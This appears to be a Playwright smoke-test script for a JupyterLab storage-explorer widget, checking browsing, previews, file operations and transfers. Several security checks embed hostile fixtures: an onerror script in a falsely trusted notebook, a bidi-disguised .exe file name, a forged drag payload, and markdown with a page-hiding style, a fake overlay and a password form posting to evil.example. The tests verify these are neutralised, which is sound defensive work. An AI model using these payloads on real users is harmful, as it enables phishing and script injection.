"""A smoke test of the widgets in a real JupyterLab: the main things a user
does, clicked through in the installed Microsoft Edge with Playwright.

The JavaScript has no unit tests, so this is what tells a frontend change
(or a refactoring) from a broken one. Run it by hand before merging such a
change; it is not run by pytest or CI:

    uv run --group docs tests/browser/smoke.py              # every check
    uv run --group docs tests/browser/smoke.py paste rename # some of them

It uses the docs' scripts' server and demo data (``docs/scripts/_lab.py``,
``demo_data.py``): a JupyterLab of its own in a temporary folder, with the
launcher's extension, and explorers of a made-up data lake in fsspec's memory
filesystem, whose "Scratch" storage the checks change. Each check prints
"ok" or why it failed; a failure leaves a screenshot next to this script
(``smoke-<check>.png``, git-ignored) and the next check starts on a new
notebook, so one failure does not fail the rest.
"""

# The widgets' own texts have en dashes, in ranges of rows.
# ruff: noqa: RUF001

from __future__ import annotations

import json
import pathlib
import re
import sys
import time
import traceback
from typing import TYPE_CHECKING

HERE = pathlib.Path(__file__).resolve().parent
sys.path.insert(0, str(HERE.parent.parent / "docs" / "scripts"))

import _lab  # noqa: E402
from playwright.sync_api import expect  # noqa: E402

if TYPE_CHECKING:
    from collections.abc import Callable

    from _lab import Lab
    from playwright.sync_api import Locator, Page

# The demo storages, with two more folders of Scratch for paging: "some" is
# paged by the browser, "many" (over max_browser_items) by the kernel.
EXPLORER = """\
import fsspec
import demo_data
from jupyter_storage_explorer import StorageExplorer

storages = demo_data.filesystems()
memory = fsspec.filesystem("memory")
for i in range(150):
    memory.pipe_file(f"/scratch/some/file_{i:03}.txt", b"x")
for i in range(250):
    memory.pipe_file(f"/scratch/many/file_{i:03}.txt", b"x")
StorageExplorer(filesystems=storages, supports=demo_data.supports(), max_browser_items=200)"""

# A switch or button that is on.
ON = re.compile(r"\bjse-on\b")

CHECKS: dict[str, Callable[[Explorer], None]] = {}


def check(fn: Callable[[Explorer], None]) -> Callable[[Explorer], None]:
    CHECKS[fn.__name__] = fn
    return fn


class Explorer:
    """A notebook showing ``EXPLORER`` (or the explorer of ``source``), and
    ways to drive it."""

    def __init__(self, lab: Lab, page: Page, source: str = EXPLORER) -> None:
        self.lab = lab
        self.page = page
        lab.open_notebook(page, source)
        self.el = page.locator(".jse-browser").first
        expect(self.el.locator(".jse-tree .jse-node").first).to_be_visible(
            timeout=90_000
        )
        self.notebook_tab = page.locator(
            ".lm-TabBar-tab.jp-mod-current"
        ).first.inner_text()

    # --- Locators ---

    def node(self, name: str) -> Locator:
        """A folder of the tree."""
        return (
            self.el.locator(".jse-tree .jse-node")
            .filter(has=self.page.get_by_text(name, exact=True))
            .first
        )

    def row(self, name: str) -> Locator:
        """An item of the list."""
        return (
            self.el.locator(".jse-list tbody tr")
            .filter(has=self.page.get_by_text(name, exact=True))
            .first
        )

    @property
    def names(self) -> Locator:
        """The names in the list, in order."""
        return self.el.locator(".jse-list tbody td.jse-col-name")

    def menu_item(self, text: str) -> Locator:
        return self.el.locator(
            ".jse-menu:not(.jse-submenu) > .jse-menu-item:visible", has_text=text
        ).first

    def button(self, label: str) -> Locator:
        """A button of the explorer's confirmation dialog."""
        return self.el.locator(".jse-confirm:visible").get_by_role(
            "button", name=label, exact=True
        )

    @property
    def status(self) -> Locator:
        return self.el.locator(".jse-status")

    @property
    def preview(self) -> Locator:
        return self.el.locator(".jse-preview-panel")

    # --- Actions ---

    def storage(self, name: str) -> None:
        self.el.locator(".jse-fs-select").select_option(name)
        expect(self.el.locator(".jse-tree .jse-node").first).to_contain_text(
            "sales-lake" if name == "Sales lake" else "scratch"
        )

    def top(self, storage: str) -> None:
        """Show the top folder of ``storage``."""
        self.storage(storage)
        self.el.locator(".jse-crumb").first.click()
        expect(self.el.locator(".jse-crumb")).to_have_count(1)

    def go(self, *folders: str, storage: str = "Sales lake") -> None:
        """Show a folder of ``storage``: the first from the tree, then down the list."""
        self.storage(storage)
        self.node(folders[0]).click()
        expect(self.el.locator(".jse-crumb").last).to_have_text(folders[0])
        for name in folders[1:]:
            self.row(name).dblclick()
            expect(self.el.locator(".jse-crumb").last).to_have_text(name)

    def menu(self, target: Locator, item: str) -> None:
        """Choose ``item`` in ``target``'s right-click menu."""
        target.click(button="right")
        self.menu_item(item).click()

    def list_menu(self, item: str) -> None:
        """Choose ``item`` in the menu of the list's empty space."""
        box = self.el.locator(".jse-list").bounding_box()
        assert box is not None
        self.el.locator(".jse-list").click(
            button="right", position={"x": 40, "y": box["height"] - 12}
        )
        self.menu_item(item).click()

    def back_to_notebook(self) -> None:
        self.page.locator(".lm-TabBar-tab", has_text=self.notebook_tab).first.click()
        expect(self.el).to_be_visible()


# --- Browsing ---


@check
def browse(x: Explorer) -> None:
    x.go("curated")
    expect(x.names).to_have_text(["customers", "orders_by_month", "orders.parquet"])
    # Icons: the format's file_icon, else the extension's (Text sets none).
    icon = ".jse-col-name svg"
    expect(x.row("orders.parquet").locator(icon)).to_have_attribute(
        "data-icon", "spreadsheet"
    )
    expect(x.row("customers").locator(icon)).to_have_attribute("data-icon", "folder")
    x.go("pipelines")
    expect(x.row("daily_orders.yaml").locator(icon)).to_have_attribute(
        "data-icon", "yaml"
    )
    expect(x.row("monthly_revenue.sql").locator(icon)).to_have_attribute(
        "data-icon", "file"
    )
    x.go("curated")
    x.row("customers").dblclick()
    expect(x.el.locator(".jse-crumb")).to_have_text(
        ["/sales-lake", "curated", "customers"]
    )
    x.el.locator(".jse-toolbar button[title='Parent directory']").click()
    expect(x.el.locator(".jse-crumb").last).to_have_text("curated")
    x.el.locator(".jse-crumb", has_text="/sales-lake").click()
    expect(x.names.first).to_have_text("curated")
    # The settings button is in the launcher's tabs only (launcher_settings);
    # the engine, in the status bar, in every explorer.
    expect(x.el.locator(".jse-settings-btn")).to_be_hidden()
    expect(x.el.locator(".jse-engine-btn")).to_have_text("Polars")


@check
def sort(x: Explorer) -> None:
    x.go("curated")
    header = x.el.locator(".jse-list th", has_text="Name")
    header.click()  # descending; folders stay first
    expect(x.names).to_have_text(["orders_by_month", "customers", "orders.parquet"])
    header.click()
    expect(x.names).to_have_text(["customers", "orders_by_month", "orders.parquet"])


@check
def filter_list(x: Explorer) -> None:
    x.go("landing", "orders")
    # Typed once the folder's items are shown, as their arrival clears it.
    months = ["orders_2026-07.csv", "orders_2026-08.csv", "orders_2026-09.csv"]
    expect(x.names).to_have_text(months)
    field = x.el.locator(".jse-list-pane .jse-filter-input")
    field.fill("08")
    expect(x.names).to_have_text(["orders_2026-08.csv"])
    expect(x.status).to_contain_text("1 of 3 items match")
    x.el.locator(".jse-list-pane .jse-filter-regex").click()
    field.fill(r"0[79]\.csv$")
    expect(x.names).to_have_text(["orders_2026-07.csv", "orders_2026-09.csv"])
    field.press("Escape")  # clears it
    expect(x.names).to_have_text(months)


@check
def paging(x: Explorer) -> None:
    label = x.el.locator(".jse-page-label")
    following = x.el.locator(".jse-pager button[title='Next page']")
    # Paged by the browser.
    x.go("some", storage="Scratch")
    expect(label).to_have_text("1–100 of 150")
    following.click()
    expect(label).to_have_text("101–150 of 150")
    expect(x.names.first).to_have_text("file_100.txt")
    # Paged by the kernel: over max_browser_items.
    x.go("many", storage="Scratch")
    expect(label).to_have_text("1–100 of 250")
    following.click()
    expect(x.names.first).to_have_text("file_100.txt")
    x.el.locator(".jse-list th", has_text="Name").click()
    expect(x.names.first).to_have_text("file_249.txt")
    x.el.locator(".jse-list-pane .jse-filter-input").fill("file_24")
    expect(label).to_be_hidden()  # one page
    expect(x.names).to_have_count(10)


# --- Previews and data ---


@check
def preview(x: Explorer) -> None:
    x.go("pipelines")
    x.row("README.md").click()
    link = x.el.locator(".jse-status-bar .jse-preview-btn")
    expect(link).to_have_text("Preview (Markdown)")
    link.click()
    expect(x.preview.locator(".jse-markdown")).to_contain_text(
        "Owner: data platform team"
    )
    # The open panel follows the selection.
    x.row("daily_orders.yaml").click()
    expect(x.preview.locator(".jse-text")).to_contain_text("pipeline: daily_orders")
    x.preview.press("Escape")
    expect(x.preview).to_be_hidden()


@check
def query(x: Explorer) -> None:
    x.go("curated")
    x.row("orders.parquet").click()
    x.el.locator(".jse-status-bar .jse-preview-btn", has_text="Preview").click()
    status = x.preview.locator(".jse-query-status")
    expect(status).to_have_text("Rows 1–100 / 2,400")
    x.preview.locator(".jse-query-bar button[title='Next page']").click()
    expect(status).to_have_text("Rows 101–200 / 2,400")
    # A filter, from the column's funnel.
    header = x.preview.locator(
        "th", has=x.page.locator(".jse-query-name", has_text="channel")
    ).first
    header.locator(".jse-query-filter").click()
    dialog = x.el.locator(".jse-confirm:visible")
    dialog.locator("select").first.select_option(label="Contains")
    dialog.locator("input[type=text], input:not([type])").first.fill("wholesale")
    dialog.get_by_role("button", name="Apply").click()
    expect(x.preview.locator(".jse-query-chips")).to_contain_text(
        "channel contains wholesale"
    )
    expect(status).to_have_text("Rows 1–100 / 341")
    x.preview.locator(".jse-query-bar .jse-btn", has_text="Reset").click()
    expect(status).to_have_text("Rows 1–100 / 2,400")
    x.preview.press("Escape")


@check
def delta_folder(x: Explorer) -> None:
    # The folder shown, with nothing selected: a Delta table, queried.
    x.go("curated", "customers")
    link = x.el.locator(".jse-status-bar .jse-preview-btn")
    expect(link).to_have_text("Preview (Delta Lake table)")
    link.click()
    expect(x.preview.locator(".jse-query-status")).to_contain_text("/ 200")
    x.preview.press("Escape")


@check
def partitioned_parquet(x: Explorer) -> None:
    # Hive-style partitions (year=…/month=…/): one table, its partition
    # columns from the folders' names.
    x.go("curated")
    x.row("orders_by_month").click()
    link = x.el.locator(".jse-status-bar .jse-preview-btn")
    expect(link).to_have_text("Preview (Parquet)")
    link.click()
    expect(x.preview.locator(".jse-query-status")).to_have_text("Rows 1–100 / 2,400")
    for column in ("year", "month"):
        expect(
            x.preview.locator(".jse-query-name", has_text=re.compile(f"^{column}$"))
        ).to_be_visible()
    x.preview.press("Escape")


@check
def python_code(x: Explorer) -> None:
    x.go("curated")
    x.row("orders.parquet").click(button="right")
    x.menu_item("Python code").hover()
    # Each recipe by title, with its engine.
    x.el.locator(".jse-submenu .jse-menu-item:visible").filter(
        has_text="Load as DataFrame (Polars)"
    ).click()
    dialog = x.el.locator(".jse-dialog:visible")
    expect(dialog).to_contain_text("Load as DataFrame (Polars)")
    expect(dialog).to_contain_text("read_parquet")
    expect(dialog).to_contain_text("Needs polars")
    dialog.press("Escape")
    expect(dialog).to_be_hidden()


@check
def engines(x: Explorer) -> None:
    # Previews use the engine chosen in the status bar: Polars first.
    engine_btn = x.el.locator(".jse-engine-btn")
    panel = x.el.locator(".jse-preview-panel")
    badge = panel.locator(".jse-badge")
    x.go("curated")
    x.menu(x.row("orders.parquet"), "Preview Parquet")
    expect(badge).to_have_text("Parquet · Polars")
    expect(panel.locator(".jse-query")).to_be_visible()  # the data browser

    def choose(engine: str) -> None:
        engine_btn.click()
        x.menu_item(engine).click()
        expect(engine_btn).to_have_text(engine)

    # Another engine: the preview open is viewed again with it.
    choose("pandas")
    expect(badge).to_have_text("Parquet · pandas")
    expect(panel.locator(".jse-section-table")).to_be_visible()  # its first rows
    # "Preview as": each format and engine that can view the item.
    x.row("orders.parquet").click(button="right")
    x.menu_item("Preview as").hover()
    x.el.locator(
        ".jse-submenu .jse-menu-item:visible", has_text="Parquet (Polars)"
    ).click()
    expect(badge).to_have_text("Parquet · Polars")
    # A format pandas does not handle: the built-in view, whatever the engine.
    x.go("pipelines")
    x.menu(x.row("README.md"), "Preview Markdown")
    expect(badge).to_have_text("Markdown")
    choose("Polars")


@check
def properties(x: Explorer) -> None:
    x.menu(x.node("landing"), "Properties")
    dialog = x.el.locator(".jse-dialog:visible")
    expect(dialog.locator(".jse-props").first).to_contain_text("Files")
    expect(dialog).to_contain_text("Properties of landing")
    dialog.press("Escape")
    x.go("pipelines")
    x.menu(x.row("ingest.log"), "Properties")
    expect(dialog).to_contain_text("From the storage")
    dialog.press("Escape")


@check
def bookmarks(x: Explorer) -> None:
    x.go("reports")
    star = x.el.locator(".jse-bookmark-btn")
    star.click()
    x.menu_item("Bookmark this folder").click()
    expect(star).to_have_class(ON)
    x.go("landing")
    expect(star).not_to_have_class(ON)
    star.click()
    x.menu_item("[Sales lake] /sales-lake/reports").click()
    expect(x.el.locator(".jse-crumb").last).to_have_text("reports")
    expect(star).to_have_class(ON)
    x.menu(x.node("reports"), "Remove bookmark")
    expect(star).not_to_have_class(ON)


# --- File operations, in Scratch ---


@check
def copy_paste(x: Explorer) -> None:
    x.go("landing")
    x.menu(x.row("products.tsv"), "Copy")
    expect(x.status).to_contain_text("Copied products.tsv")
    x.top("Scratch")
    x.list_menu("Paste products.tsv")
    x.button("Paste").click()
    expect(x.row("products.tsv")).to_be_visible()
    expect(x.status).to_contain_text("Pasted products.tsv")


@check
def rename(x: Explorer) -> None:
    x.top("Scratch")
    paste_from_lake(x, "catalog.json")
    x.menu(x.row("catalog.json"), "Rename")
    x.el.locator(".jse-confirm:visible .jse-name-input").fill("catalog-copy.json")
    x.button("Rename").click()
    expect(x.row("catalog-copy.json")).to_be_visible()
    expect(x.row("catalog.json")).to_have_count(0)


@check
def create_folder(x: Explorer) -> None:
    x.top("Scratch")
    x.list_menu("Create a folder")
    field = x.el.locator(".jse-confirm:visible .jse-name-input")
    field.fill("a/b")
    x.button("Create").click()
    expect(x.el.locator(".jse-confirm:visible .jse-error-text")).to_contain_text(
        "without /"
    )
    field.fill("archive")
    x.button("Create").click()
    expect(x.row("archive")).to_be_visible()


@check
def move_by_drag(x: Explorer) -> None:
    x.top("Scratch")
    new_folder(x, "inbox")
    paste_from_lake(x, "catalog.json")
    x.row("catalog.json").drag_to(x.row("inbox"))
    x.button("Move").click()
    expect(x.row("catalog.json")).to_have_count(0)
    x.row("inbox").dblclick()
    expect(x.names).to_have_text(["catalog.json"])


@check
def cut_paste(x: Explorer) -> None:
    x.top("Scratch")
    new_folder(x, "outbox")
    paste_from_lake(x, "catalog.json")
    x.menu(x.row("catalog.json"), "Cut")
    x.menu(x.row("outbox"), "Move catalog.json here")
    x.button("Move").click()
    expect(x.row("catalog.json")).to_have_count(0)
    x.row("outbox").dblclick()
    expect(x.names).to_have_text(["catalog.json"])


@check
def delete(x: Explorer) -> None:
    x.top("Scratch")
    paste_from_lake(x, "catalog.json")
    x.menu(x.row("catalog.json"), "Delete")
    x.button("Delete").click()
    expect(x.row("catalog.json")).to_have_count(0)


@check
def unsafe_mode(x: Explorer) -> None:
    x.top("Scratch")
    new_folder(x, "old")
    switch = x.el.locator(".jse-unsafe")
    # Locked: no folder operations.
    x.row("old").click(button="right")
    expect(x.menu_item("Delete")).to_have_count(0)
    x.page.keyboard.press("Escape")
    # On for one operation: the folder is moved into another.
    switch.click()
    expect(switch).to_have_class(ON)
    x.row("old").drag_to(x.row("exports"))
    x.button("Move").click()
    expect(x.row("old")).to_have_count(0)
    expect(switch).not_to_have_class(ON)
    # And deleted.
    x.row("exports").dblclick()
    switch.click()
    x.menu(x.row("old"), "Delete")
    expect(x.el.locator(".jse-confirm:visible")).to_contain_text(
        "Folders are deleted with everything in them"
    )
    x.button("Delete").click()
    expect(x.row("old")).to_have_count(0)


# --- Transfers: the user's computer and JupyterLab ---


@check
def download_to_local(x: Explorer) -> None:
    x.go("pipelines")
    with x.page.expect_download() as download:
        x.menu(x.row("ingest.log"), "Download to local")
    assert download.value.suggested_filename == "ingest.log"
    expect(x.status).to_contain_text("Downloaded 1 file to local")


@check
def download_to_jupyterlab(x: Explorer) -> None:
    x.go("pipelines")
    x.menu(x.row("monthly_revenue.sql"), "Download to JupyterLab")
    x.button("Download").click()
    expect(x.status).to_contain_text("Downloaded monthly_revenue.sql")
    wait_for((x.lab.root / "monthly_revenue.sql").is_file, "the file on the server")


@check
def download_by_drag(x: Explorer) -> None:
    # Dropped on JupyterLab's file browser (the launcher's extension).
    x.go("pipelines")
    x.row("daily_orders.yaml").drag_to(x.page.locator(".jp-DirListing-content").first)
    dialog = x.page.locator(".jp-Dialog")
    expect(dialog).to_contain_text("Download daily_orders.yaml from Storage Explorer")
    dialog.get_by_role("button", name="Download").click()
    wait_for((x.lab.root / "daily_orders.yaml").is_file, "the file on the server")


@check
def download_folder_by_drag(x: Explorer) -> None:
    # A folder (unsafe mode) dropped on JupyterLab's file browser: not
    # downloaded, and said so, as only the drop can tell what the drag holds.
    x.storage("Sales lake")
    x.el.locator(".jse-crumb", has_text="/sales-lake").click()
    x.el.locator(".jse-unsafe").click()
    x.row("reports").drag_to(x.page.locator(".jp-DirListing-content").first)
    dialog = x.page.locator(".jp-Dialog")
    expect(dialog).to_contain_text("Download reports from Storage Explorer")
    dialog.get_by_role("button", name="Download").click()
    # In JupyterLab's notifications (the bell in the status bar).
    x.page.locator(".jp-Notification-Status").click()
    expect(
        x.page.get_by_text("reports: folders are not downloaded").first
    ).to_be_visible()
    x.page.locator(".jp-Notification-Status").click()
    assert not (x.lab.root / "reports").exists()


@check
def drag_from_another_page_refused(x: Explorer) -> None:
    # A drop of our type from another page (tab, window, site), whatever it
    # carries: never taken, as only this page's drag (by its id) is.
    x.top("Scratch")
    crafted = json.dumps(
        {
            "explorer": "elsewhere",
            "filesystem": {"name": "Sales lake"},
            "folders": True,
            "unsafe": True,
            "files": [
                {
                    "path": "/sales-lake/catalog.json",
                    "name": "catalog.json",
                    "location": {
                        "kind": "fsspec",
                        "url": "memory:///sales-lake/catalog.json",
                    },
                }
            ],
        }
    )
    drop = """(list, [value, pageDrag]) => {
      const key = Symbol.for("jupyter-storage-explorer.drag");
      globalThis[key] = pageDrag;
      const data = new DataTransfer();
      data.setData("application/x-jupyter-storage-explorer-items", value);
      for (const type of ["dragenter", "dragover", "drop"]) {
        list.dispatchEvent(new DragEvent(type, { bubbles: true, cancelable: true, dataTransfer: data }));
      }
      globalThis[key] = null;
    }"""
    lst = x.el.locator(".jse-list")
    # No drag on this page: not even taken.
    lst.evaluate(drop, [crafted, None])
    # This page has a drag, but the drop carries another id.
    page_drag = {"id": "this-page", "explorer": "x", "unsafe": False, "items": {}}
    lst.evaluate(drop, ["another-page", page_drag])
    expect(x.status).to_contain_text(
        "Drag files between explorers of one JupyterLab page"
    )
    expect(x.el.locator(".jse-confirm:visible")).to_have_count(0)
    expect(x.row("catalog.json")).to_have_count(0)


@check
def hidden_characters_shown(x: Explorer) -> None:
    # A name with a bidi override reads as another ("reportexe.jpg"): shown
    # with the character escaped, in the list and the messages.
    x.top("Scratch")
    x.el.locator(".jse-list").evaluate(
        """(list) => {
          const data = new DataTransfer();
          data.items.add(new File(["x"], "report\u202egpj.exe", { type: "application/octet-stream" }));
          for (const type of ["dragenter", "dragover", "drop"]) {
            list.dispatchEvent(new DragEvent(type, { bubbles: true, cancelable: true, dataTransfer: data }));
          }
        }"""
    )
    expect(x.el.locator(".jse-confirm:visible")).to_contain_text("report\\u202egpj.exe")
    x.button("Upload").click()
    expect(x.row("report\\u202egpj.exe")).to_be_visible()
    expect(x.status).to_contain_text("Uploaded report\\u202egpj.exe")


@check
def upload_from_computer(x: Explorer) -> None:
    # A native drop of a file, as from the computer's file manager.
    x.top("Scratch")
    x.el.locator(".jse-list").evaluate(
        """(list) => {
          const data = new DataTransfer();
          data.items.add(new File(["hello\\n"], "hello.txt", { type: "text/plain" }));
          for (const type of ["dragenter", "dragover", "drop"]) {
            list.dispatchEvent(new DragEvent(type, { bubbles: true, cancelable: true, dataTransfer: data }));
          }
        }"""
    )
    x.button("Upload").click()
    expect(x.row("hello.txt")).to_be_visible()
    expect(x.status).to_contain_text("Uploaded hello.txt")


@check
def upload_from_jupyterlab(x: Explorer) -> None:
    # A drop of JupyterLab's file browser (a Lumino drag, as it sends it).
    (x.lab.root / "from_lab.txt").write_text("from JupyterLab\n", encoding="utf-8")
    x.top("Scratch")
    x.el.locator(".jse-list").evaluate(
        """(list) => {
          for (const type of ["lm-dragenter", "lm-dragover", "lm-drop"]) {
            const ev = new Event(type, { bubbles: true, cancelable: true });
            ev.mimeData = {
              hasData: (mime) => mime === "application/x-jupyter-icontents",
              getData: () => ["from_lab.txt"],
            };
            ev.proposedAction = "move";
            ev.dropAction = "none";
            list.dispatchEvent(ev);
          }
        }"""
    )
    x.button("Upload").click()
    expect(x.row("from_lab.txt")).to_be_visible()


# --- JupyterLab: its editors and tabs (the launcher's extension) ---


@check
def open_in_jupyterlab(x: Explorer) -> None:
    x.top("Scratch")
    # A text file, which opens in JupyterLab's editor.
    paste_from_lake(x, "daily_orders.yaml", "pipelines")
    x.row("daily_orders.yaml").click()
    # Previewed, to see the edit.
    x.el.locator(".jse-status-bar .jse-preview-btn").click()
    x.row("daily_orders.yaml").dblclick()
    editor = x.page.locator(".jp-FileEditor .cm-content").first
    expect(editor).to_contain_text("pipeline: daily_orders")
    x.page.locator(".jp-FileEditor .cm-line").first.click()
    x.page.keyboard.press("Control+Home")
    x.page.keyboard.type("# edited\n")
    x.page.keyboard.press("Control+s")
    dirty = x.page.locator(".lm-TabBar-tab.jp-mod-current.jp-mod-dirty")
    expect(dirty).to_have_count(0)
    x.back_to_notebook()
    expect(x.preview).to_contain_text("# edited")
    x.preview.press("Escape")


# A notebook whose cell claims to be trusted, with outputs that run script
# when rendered as trusted: written by anyone with access to a storage.
UNTRUSTED_NOTEBOOK = {
    "nbformat": 4,
    "nbformat_minor": 5,
    "metadata": {
        "kernelspec": {
            "name": "python3",
            "display_name": "Python 3",
            "language": "python",
        }
    },
    "cells": [
        {
            "cell_type": "code",
            "execution_count": 1,
            "id": "c1",
            "metadata": {"trusted": True},
            "source": "1",
            "outputs": [
                {
                    "output_type": "display_data",
                    "metadata": {},
                    "data": {
                        "text/html": '<img src="x" onerror="window.__jse_ran = true">',
                        "application/javascript": "window.__jse_ran = true;",
                        "text/plain": "output",
                    },
                }
            ],
        }
    ],
}


@check
def notebook_opened_untrusted(x: Explorer) -> None:
    # A notebook from a storage, opened in JupyterLab: its outputs never run
    # script by themselves, whatever its cells claim.
    x.top("Scratch")
    x.el.locator(".jse-list").evaluate(
        """(list, text) => {
          const data = new DataTransfer();
          data.items.add(new File([text], "untrusted.ipynb", { type: "application/json" }));
          for (const type of ["dragenter", "dragover", "drop"]) {
            list.dispatchEvent(new DragEvent(type, { bubbles: true, cancelable: true, dataTransfer: data }));
          }
        }""",
        json.dumps(UNTRUSTED_NOTEBOOK),
    )
    x.button("Upload").click()
    x.row("untrusted.ipynb").dblclick()
    expect(
        x.page.locator(
            ".jp-NotebookPanel:not(.lm-mod-hidden) .jp-OutputArea-output"
        ).first
    ).to_be_visible()
    x.page.wait_for_timeout(1500)
    assert x.page.evaluate("window.__jse_ran") is None, "the notebook's outputs ran"
    x.back_to_notebook()


@check
def notebook_trust_kept(x: Explorer) -> None:
    # Trusted by the user and saved, a notebook from a storage is trusted
    # when opened again (signed with nbformat's notary, as JupyterLab does).
    notebook = json.loads(json.dumps(UNTRUSTED_NOTEBOOK))
    notebook["cells"][0]["outputs"][0]["data"] = {
        "application/javascript": "window.__jse_trusted_ran = (window.__jse_trusted_ran || 0) + 1;",
        "text/plain": "output",
    }
    x.top("Scratch")
    x.el.locator(".jse-list").evaluate(
        """(list, text) => {
          const data = new DataTransfer();
          data.items.add(new File([text], "trusted.ipynb", { type: "application/json" }));
          for (const type of ["dragenter", "dragover", "drop"]) {
            list.dispatchEvent(new DragEvent(type, { bubbles: true, cancelable: true, dataTransfer: data }));
          }
        }""",
        json.dumps(notebook),
    )
    x.button("Upload").click()
    x.row("trusted.ipynb").dblclick()
    shown = x.page.locator(".jp-NotebookPanel:not(.lm-mod-hidden)")
    expect(shown.locator(".jp-OutputArea-output").first).to_be_visible()
    assert x.page.evaluate("window.__jse_trusted_ran") is None
    # Trust it (JupyterLab's command, from its palette: the notebook focused
    # first, as the shortcut needs the focus in JupyterLab), then save.
    x.page.locator(".lm-TabBar-tab.jp-mod-current", has_text="trusted.ipynb").click()
    x.page.keyboard.press("Control+Shift+c")
    x.page.locator(".lm-CommandPalette-input").fill("Trust Notebook")
    x.page.locator(
        ".lm-CommandPalette-item:visible", has_text="Trust Notebook"
    ).first.click()
    x.page.locator(".jp-Dialog-footer .jp-Dialog-button", has_text="Trust").click()
    x.page.wait_for_timeout(1000)
    trusted_runs = x.page.evaluate("window.__jse_trusted_ran || 0")
    x.page.keyboard.press("Control+s")
    expect(x.page.locator(".lm-TabBar-tab.jp-mod-current.jp-mod-dirty")).to_have_count(
        0
    )
    # Closed, then opened again from the explorer: trusted, its output runs.
    x.page.locator(".lm-TabBar-tab.jp-mod-current .lm-TabBar-tabCloseIcon").click()
    x.back_to_notebook()
    x.row("trusted.ipynb").dblclick()
    expect(shown.locator(".jp-OutputArea-output").first).to_be_visible()
    x.page.wait_for_timeout(1500)
    assert x.page.evaluate("window.__jse_trusted_ran || 0") > trusted_runs, (
        "not trusted again"
    )
    x.back_to_notebook()


# A notebook whose outputs link to an image by a relative path (next to it),
# which the drive does not serve.
RELATIVE_IMAGE_NOTEBOOK = {
    "nbformat": 4,
    "nbformat_minor": 5,
    "metadata": {
        "kernelspec": {
            "name": "python3",
            "display_name": "Python 3",
            "language": "python",
        }
    },
    "cells": [
        {
            "cell_type": "markdown",
            "id": "m1",
            "metadata": {},
            "source": "![chart](chart.png)",
        },
        {
            "cell_type": "code",
            "execution_count": 1,
            "id": "c1",
            "metadata": {},
            "source": "1",
            "outputs": [
                {
                    "output_type": "display_data",
                    "metadata": {},
                    "data": {
                        "text/html": '<img src="chart.png">',
                        "text/plain": "chart",
                    },
                }
            ],
        },
    ],
}


@check
def notebook_relative_links_and_download(x: Explorer) -> None:
    # Relative links load nothing, without an error; File > Download saves
    # the file itself.
    text = json.dumps(RELATIVE_IMAGE_NOTEBOOK)
    x.top("Scratch")
    x.el.locator(".jse-list").evaluate(
        """(list, text) => {
          const data = new DataTransfer();
          data.items.add(new File([text], "charts.ipynb", { type: "application/json" }));
          for (const type of ["dragenter", "dragover", "drop"]) {
            list.dispatchEvent(new DragEvent(type, { bubbles: true, cancelable: true, dataTransfer: data }));
          }
        }""",
        text,
    )
    x.button("Upload").click()
    x.row("charts.ipynb").dblclick()
    panel = x.page.locator(".jp-NotebookPanel:not(.lm-mod-hidden)")
    expect(panel.locator(".jp-OutputArea-output").first).to_be_visible()
    x.page.wait_for_timeout(1500)
    expect(panel).not_to_contain_text("Javascript Error")
    with x.page.expect_download() as download:
        x.page.locator(".lm-MenuBar-itemLabel", has_text="File").click()
        x.page.locator(".lm-Menu-itemLabel", has_text="Download").first.click()
    saved = json.loads(pathlib.Path(download.value.path()).read_text(encoding="utf-8"))
    assert saved["cells"][0]["source"] == "![chart](chart.png)", saved
    x.back_to_notebook()


# Markdown whose HTML would restyle or cover JupyterLab, or ask for a password.
HOSTILE_MARKDOWN = """# Report

<p>x</p><style>.jp-LabShell { display: none }</style>
<div style="position: fixed; inset: 0; background: white">Session expired</div>
<form action="https://evil.example/login"><input type="password"><button>Sign in</button></form>
<img src="x" onerror="window.__jse_ran = true">

| a | b |
|--:|---|
| 1 | 2 |
"""


@check
def markdown_preview_sanitized(x: Explorer) -> None:
    x.top("Scratch")
    x.el.locator(".jse-list").evaluate(
        """(list, text) => {
          const data = new DataTransfer();
          data.items.add(new File([text], "report.md", { type: "text/markdown" }));
          for (const type of ["dragenter", "dragover", "drop"]) {
            list.dispatchEvent(new DragEvent(type, { bubbles: true, cancelable: true, dataTransfer: data }));
          }
        }""",
        HOSTILE_MARKDOWN,
    )
    x.button("Upload").click()
    x.row("report.md").click()
    x.el.locator(".jse-status-bar .jse-preview-btn").click()
    markdown = x.preview.locator(".jse-markdown")
    expect(markdown.locator("h1")).to_have_text("Report")
    expect(markdown.locator("td").first).to_have_text("1")  # tables kept
    for selector in ("style", "form", "input", "button", "[style]"):
        expect(markdown.locator(selector)).to_have_count(0)
    expect(x.page.locator(".jp-LabShell")).to_be_visible()
    assert x.page.evaluate("window.__jse_ran") is None, "the file's script ran"
    x.preview.press("Escape")


@check
def view_in_new_tab(x: Explorer) -> None:
    # Data: the data browser, a DataExplorer, in the tab.
    x.go("curated")
    x.menu(x.row("orders.parquet"), "View Parquet in new tab")
    tab = x.page.locator(".jse-query-tab")
    expect(tab.locator(".jse-query-status")).to_have_text("Rows 1–100 / 2,400")
    expect(x.page.locator(".lm-TabBar-tab.jp-mod-current")).to_contain_text(
        "orders.parquet"
    )
    x.page.locator(".lm-TabBar-tab.jp-mod-current .lm-TabBar-tabCloseIcon").click()
    expect(tab).to_have_count(0)
    x.back_to_notebook()
    # Other views: a ViewTab, rendered as in the preview panel.
    x.go("pipelines")
    x.menu(x.row("README.md"), "View Markdown in new tab")
    view = x.page.locator(".jse-query-tab .jse-view-tab")
    expect(view.locator(".jse-markdown")).to_contain_text("Sales lake")
    x.page.locator(".lm-TabBar-tab.jp-mod-current .lm-TabBar-tabCloseIcon").click()
    expect(view).to_have_count(0)
    x.back_to_notebook()


# --- The launcher's tab ---


# Checks given the server and the page, each on a page of its own.
LAB_CHECKS: dict[str, Callable[[Lab, Page], None]] = {}


def lab_check(fn: Callable[[Lab, Page], None]) -> Callable[[Lab, Page], None]:
    LAB_CHECKS[fn.__name__] = fn
    return fn


# An explorer whose preview panel starts open, and labels its on_change and
# on_query_change functions write to.
CALLBACKS = """\
import demo_data
import ipywidgets
from jupyter_storage_explorer import StorageExplorer

explorer = StorageExplorer(
    filesystems=demo_data.filesystems(), supports=demo_data.supports(), open_preview=True
)
selected = ipywidgets.Label("-").add_class("smoke-selected")
rows = ipywidgets.Label("-").add_class("smoke-rows")


def show_selected(e):
    selected.value = ",".join(url.rsplit("/", 1)[-1] for url in e.selected_urls) or "-"


def show_rows(e):
    result = e.query_result()
    rows.value = "none" if result is None else str(len(result.collect()))


explorer.on_change(show_selected)
explorer.on_query_change(show_rows)
display(explorer, selected, rows)"""


